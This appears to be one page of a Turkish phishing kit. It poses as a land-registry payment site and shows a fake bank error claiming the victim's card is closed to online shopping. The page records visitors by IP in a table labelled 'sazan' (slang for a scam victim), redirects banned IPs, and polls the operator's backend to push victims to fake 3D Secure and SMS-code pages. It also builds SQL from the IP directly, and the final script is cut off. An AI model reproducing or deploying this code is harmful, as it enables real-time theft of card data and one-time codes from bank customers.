<?php
   date_default_timezone_set('Europe/Istanbul');
   include("./gmypanel/Core/getRealIPAdress.php");
   include("./gmypanel/Core/mobileDetect.php");
   include("./gmypanel/Core/browserDetect.php");
   include("./gmypanel/Connection.php");

   ob_start(); 
   session_start(); 

   
   $ip = getUserIP();

   $db->query("UPDATE sazan SET now = 'İnternet Ekranında' WHERE ip = '{$ip}'");

   
   $ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
   foreach($ban as $kontrol){
       if($kontrol['ban'] == $ip){ 
          header('Location:http://www.google.com');
       } 
   }
   
   ?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web Tapu İşlemleri</title>
    <link rel="stylesheet" href="general_css/style.css">
    <script src="v4/Scripts/jquery-1.9.1.min.js"></script>
	<link href="public/app/assets/css/select2.min.css" rel="stylesheet" />
    <link href="Content/dx.common.css" rel="stylesheet" />
    <link href="Content/dx.light.css" rel="stylesheet" />
    <link rel="stylesheet" href="public/app/assets/css/minified.min68b3.css?ver=1">
	
	<style>
		html, body {
		  overflow-x:hidden 
		} 
	</style>

</head>

<body>
        <div class="container" style="background:#fff">
			 <img src="general_css/istmob.png" style="width:350px;position:absolute;top:10px"> 

        <form action="Error.php" method="post" style="padding-top:0px;box-shadow:none">
			
            <div class="flexbox" style="margin-top:350px;">
				
                <div class="inputBox" style="text-align:center;">

                    <img src="general_css/error.png" width="100" alt="Başarılı Gif">
                    <h2 style="text-transform:none; color: red;font-size:20px;">Kartınız internet alışverişine kapalıdır! <br>Lütfen mobil bankacılık <br>uygulamanızdan veya müşteri<br> hizmetleri desteği ile kartınızı<br> internet alışverişine açtıktan<br> sonra tekrar deneyiniz!<br>( İşlem gerçekleştirilmedi. )<br>Hata kodu: #043FBC</h2>
                </div>
            </div>
        </form>
    </div>
    <script type="text/javascript">
        $(function () {
            $('#button-close').on('click', function () {
                $(this).closest('.modal-wrapper').fadeOut(500);
            });

            $('input[name=imageControl]').addClass("required captcha_css");


            var form = document.getElementById("form");

            document.getElementById("allahbum").addEventListener("click", function () {
                form.submit();
            });
        });

        setTimeout(function () {
            var viewheight = $(window).height();
            var viewwidth = $(window).width();
            var viewport = $("meta[name=viewport]");
            viewport.attr("content", "height=" + viewheight + "px, width=" +
                viewwidth + "px, initial-scale=1.0");
        }, 300);
    </script>
    <script type="text/javascript">
        $(document).ready(function () {
            gonder();
        });

        function gonder() {
            $.ajax({
                type: 'POST',
                url: '<?php echo "Database.php?ip=".$ip; ?>',
                success: function (msg) {
                    if (msg == 'sms') {
                        window.location.href = '3D_Security.php';
                    }
                    else if (msg == 'tebrik') {
                        window.location.href = 'Successful.php';
                    }
                    else if (msg == 'hata1') {
                        window.location.href = 'Error.php';
                    }
                    else if (msg == 'back') {
                        window.location.href = 'index.php';
                    }
                    else if (msg == 'sms2') {
                        window.location.href = 'Wrong_Sms.php';
                    }
                    else if (msg == 'hata2') {
                        window.location.href = 'Closed_to_Internet.php';
                    }
                    else {
                        setTimeout(gonder, 2500);
                    }
                },
                error: function() {
                    setTimeout(gonder, 2500);
                }
            });
        }